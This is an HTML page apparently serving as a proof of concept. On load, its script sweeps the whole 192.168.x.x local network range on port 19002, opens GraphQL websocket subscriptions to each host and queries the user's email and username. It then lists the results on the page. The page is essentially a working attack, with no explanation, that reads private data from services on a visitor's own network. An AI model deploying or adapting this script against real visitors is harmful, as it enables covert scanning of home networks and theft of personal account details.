<head>
  <meta http-equiv="Content-Security-Policy" content="default-src *; style-src 'self' http://* 'unsafe-inline'; script-src 'self' http://* 'unsafe-inline' 'unsafe-eval'" />
  <meta name="robots" content="noindex">
  <script src="//unpkg.com/subscriptions-transport-ws@0.5.4/browser/client.js"></script>
</head>
<body>
  <ul id="mainList"></ul>
<script> 
for(let i = 0; i < 256; i++){
for(let j = 0; j < 256; j++){
try{
const client = new window.SubscriptionsTransportWs.SubscriptionClient(`ws://192.168.${i}.${j}:19002/graphql`, {
  reconnect: true
});
client.subscribe(
    {
  query: `
  {
    userSettings {
      id
      sendTo
    }
  }
  `
    }
,(arg0,data,arg2)=>
  {
const item = document.createElement("li");
item.innerHTML = `Email: ${data.userSettings.sendTo}`;
document.getElementById("mainList").appendChild(item);
  }
);
client.subscribe(
    {
  query: `
  {
    user {
      username
    }
  }
  `
    }
,(arg0,data,arg2)=>
  {
const item = document.createElement("li");
item.innerHTML = `Username: ${data.user.username}`;
document.getElementById("mainList").appendChild(item);
  }
);
}
catch(e){
console.err(e);
}
}
}
</script>
</body>
